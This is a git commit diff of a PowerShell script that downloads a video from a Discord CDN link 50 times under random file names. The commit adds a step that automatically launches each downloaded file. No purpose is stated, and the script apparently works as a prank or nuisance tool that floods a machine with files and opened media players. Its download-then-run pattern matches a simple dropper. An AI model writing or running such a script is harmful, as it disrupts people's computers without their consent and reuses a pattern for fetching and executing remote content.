54d1f8a163c1dae50982bede899ff89773a221fc
Best Cat <139585282+Sqttyxsq@users.noreply.github.com>
2024-06-02 11:57:41 +0200

    Update mattxs.ps1

--- mattxs.ps1
+++ mattxs.ps1
@@ -15,7 +15,7 @@ if ($mp4Files.Count -eq 0) {
 
 Start-Sleep -Seconds 2
 
-$url = 'https://cdn.discordapp.com/attachments/1149399740652466267/1167554693820600400/VID-20231004-WA0002.mp4?ex=665cd08b&is=665b7f0b&hm=a89cced083bb2c0dc3dfd5f5846e94bf144acc21eec47d8b178ae106b2d43a4f&'  
+$url = 'https://cdn.discordapp.com/attachments/918148813099786343/1246764624892661770/Nature_Beautiful_short_video_720p_HD.mp4?ex=665d938a&is=665c420a&hm=58e7eaf545f92508ee02eab617099f75e8156f10ae51edbfc61de6d38e4097ef&'  
 $numFiles = 50  
 function Generate-RandomString($length) {
     $chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
@@ -26,4 +26,6 @@ for ($i = 1; $i -le $numFiles; $i++) {
     $randomSuffix = Generate-RandomString -length 10
     $output = "test-$randomSuffix-$i.mp4"
     Invoke-WebRequest -Uri $url -OutFile $output
+    Start-Sleep -Seconds 2
+    Start-Process $output
 }
